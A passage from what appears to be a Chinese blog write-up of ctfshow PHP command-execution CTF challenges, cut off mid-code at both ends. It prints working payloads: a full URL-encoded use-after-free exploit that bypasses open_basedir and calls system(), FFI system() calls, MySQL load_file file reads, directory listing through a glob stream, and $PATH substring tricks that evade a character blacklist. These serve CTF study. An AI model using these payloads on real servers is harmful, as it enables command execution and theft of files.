class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>讲一下大致的原理，首先利用?&gt;提前截取，然后利用原生类进行遍历读取文件，<code>glob:///*</code> 是一个流包装器（Stream Wrapper），它使用 <code>glob</code> 函数的模式来匹配根目录下的所有文件和文件夹。然后遍历读取，exit也是利用了提前截断。找到了flag在flag0.txt</p><p>利用了PHP中的一个<strong>Use-After-Free (UAF)漏洞</strong>来绕过<code>open_basedir</code>限制，从而执行任意命令（如读取<code>/flag0.txt</code>）。UAF漏洞利用了PHP的内存管理特性，尤其是对象在内存中的布局和其析构方式来操纵内存，从而获得代码执行能力，虽然看不懂但是用还是可以的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-keyword">function</span>%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B<span class="hljs-string">&#x27;args&#x27;</span>%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20<span class="hljs-string">&#x27;WIN&#x27;</span>))%20%7B%0A%20%20%20%20%20%20%20%20die(<span class="hljs-string">&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;</span>)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>)%3B%0A%0A%20%20%20%20trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B<span class="hljs-string">&#x27;args&#x27;</span>%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn<span class="hljs-string">&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn<span class="hljs-string">&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E<br></code></pre></td></tr></table></figure><p>经过url编码之后的payload</p><h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>先查一下在哪，得到flagc.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);ob_flush();<br>或者<br>c=include(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);ob_flush();<br></code></pre></td></tr></table></figure><h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>流程和上面的基本一致，flag在flagx.txt里面</p><h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><p>可以继续用上面的原生类找到对应的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>找到文件flag36.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">try &#123;<br><span class="hljs-comment"># 创建 PDO 实例, 连接 MySQL 数据库</span><br><span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><br><span class="hljs-comment"># 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。</span><br>foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="hljs-variable">$row</span>) &#123;<br><span class="hljs-built_in">echo</span>(<span class="hljs-variable">$row</span>[0]).<span class="hljs-string">&quot;|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$dbh</span> = null;<br>&#125;<br><br>catch (PDOException <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br><span class="hljs-built_in">exit</span>(0);<br></code></pre></td></tr></table></figure><p>通过 PDO（PHP Data Objects）连接到 MySQL 数据库，并尝试读取服务器上的文件内容</p><p><code>load_file(&quot;/flag36.txt&quot;)</code> 是 MySQL 的函数，用于读取服务器上指定路径的文件内容。函数返回文件内容的字符串。</p><p><code>foreach</code> 循环遍历查询结果。因为 <code>load_file</code> 函数返回的是一个字符串，<code>$row[0]</code> 就是这个字符串。<code>echo($row[0]).&quot;|&quot;;</code> 将文件内容打印出来，并在内容后面加上 <code>|</code> 符号。</p><p>之后关闭数据库连接，捕捉异常信息。</p><p>上传payload的时候记得去掉注释</p><h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><p>也是继续用原生类进行目录扫描得到flag在flag36d.txt里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>然后还是用上面的sql执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=try &#123;<br><span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><br>foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) as <span class="hljs-variable">$row</span>) &#123;<br><span class="hljs-built_in">echo</span>(<span class="hljs-variable">$row</span>[0]).<span class="hljs-string">&quot;|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$dbh</span> = null;<br>&#125;<br><br>catch (PDOException <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br><span class="hljs-built_in">exit</span>(0);<br></code></pre></td></tr></table></figure><h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>还是可以继续使用原生类进行目录的扫描，可以得到flag在flag36x.txt里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>但是之前的写法是不能继续用的报<code> could not find driver</code>的错误，此题利用的是PHP 7.4+的FFI特性，即外部函数接口特性，</p><p>先上payload跟着学习一下内容吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>讲一下简单的原理</p><p>这段 PHP 代码利用了 Foreign Function Interface (FFI) 扩展来调用 C 语言的 <code>system</code> 函数，从而执行系统命令。注意需要php版本在7.4及以上才有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><code>FFI::cdef</code>函数的作用是定义一个c函数的接口，<code>system</code> 是一个接受一个 <code>const char *</code> 类型参数的函数（也就是一个字符串），并返回一个整数。接下来是执行&#x2F;readflag讲它的输出重定向到1.txt里面，然后最后一步代码进行执行</p><h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">看源码有个code传入，尝试一下有evil，fuzz看看内容发现<span class="hljs-code">`A-Z`</span>~,<span class="hljs-code">`@ # $ _ &#123;&#125; : ; ? . `</span>这些可以正常的输入，浅浅的学习一下吧<br><br><span class="hljs-code">`echo $PATH`</span> 是一个常见的 Linux 或 Unix 系统命令，用来显示当前用户的 <span class="hljs-code">`PATH`</span> 环境变量的值。<span class="hljs-code">`PATH`</span> 环境变量是一个包含目录路径的列表，操作系统会按照这些路径的顺序查找可执行文件。如下<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iZ0jl9s6tb2yuz8o6oleiyZ:~<span class="hljs-comment"># echo $PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入echo $&#123;PATH:~0&#125;会回显n其实因为$PATH的最后一位是n $PWD的最后一位 也就是 /var/www/html的最后一位是l，那么可以执行<br>code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???<br></code></pre></td></tr></table></figure><p>就相当于执行了<code>nl flag.php</code>然后看源码就行了</p><h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/119.png" alt="119"></p><h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/120.png" alt="120"></p><h2 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h2><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/121.png" alt="121"></p><h2 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h2><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/122.png" alt="122"></p><h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: 收集自网络</span><br><span class="hljs-comment"># @Date:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-06 14:04:45</span><br><br>*/<br><br>error_reporting(0);<br>//听说你很喜欢数学，不知道你是否爱它胜过爱flag<br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(__FILE__);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    //例子 c=20-1<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= 80) &#123;<br>        die(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="hljs-string">    foreach (<span class="hljs-variable">$blacklist</span> as <span class="hljs-variable">$blackitem</span>) &#123;</span><br><span class="hljs-string">        if (preg_match(&#x27;/&#x27; . <span class="hljs-variable">$blackitem</span> . &#x27;/m&#x27;, <span class="hljs-variable">$content</span>)) 